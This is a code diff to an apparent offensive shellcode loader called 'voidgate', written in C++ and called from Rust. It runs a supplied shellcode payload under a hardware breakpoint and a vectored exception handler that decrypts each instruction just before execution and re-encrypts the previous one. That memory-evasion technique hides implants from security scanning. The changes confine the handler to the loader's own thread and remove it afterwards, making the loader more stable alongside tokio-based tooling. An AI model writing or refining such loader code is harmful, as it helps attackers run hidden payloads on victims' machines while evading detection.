@@ -13,9 +13,19 @@ DWORD64 payload_upper_bound =
 DWORD64 last_decrypted_asm =
     0; // Global var holding the address of the last decrypted ASM instruction.
        // This is used to encrypt back the instruction at the next iteration.
+DWORD g_voidgate_thread_id =
+    0; // Thread ID that is allowed to be single-stepped by the VEH.
 
 LONG VehDecryptHeapAsm(EXCEPTION_POINTERS *ExceptionInfo) {
   if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
+    // Only handle single-step exceptions from the voidgate thread.
+    // Other threads (e.g. tokio workers) must not be intercepted, otherwise
+    // the TRAP flag would be re-set on them and cause an infinite exception
+    // storm that terminates the remoc multiplexer.
+    if (GetCurrentThreadId() != g_voidgate_thread_id) {
+      return EXCEPTION_CONTINUE_SEARCH;
+    }
+
     // If hardware breakpoint Dr0 is set, clear it
     if (ExceptionInfo->ContextRecord->Dr0) {
       ExceptionInfo->ContextRecord->Dr0 = 0;
@@ -135,12 +145,17 @@ void voidgate(rust::Vec<rust::u8> shellcode, rust::u32 ep_offset,
     DWORD status = SetHardwareBreakpoint(payload_entry);
 
     // Install VEH to handle the payload decryption/encryption after each ASM
-    // instruction executed by the payload
+    // instruction executed by the payload.
+    // Record the current thread ID so the VEH ignores single-step exceptions
+    // raised on other threads (tokio workers, etc.).
+    g_voidgate_thread_id = GetCurrentThreadId();
     PVOID veh = AddVectoredExceptionHandler(1, &VehDecryptHeapAsm);
     if (veh) {
       VoidGate vg = (VoidGate)payload_entry;
       vg();
+      RemoveVectoredExceptionHandler(veh);
     }
+    g_voidgate_thread_id = 0;
 
     // Cleanup
     VirtualFree(heap_memory, 0, MEM_RELEASE);
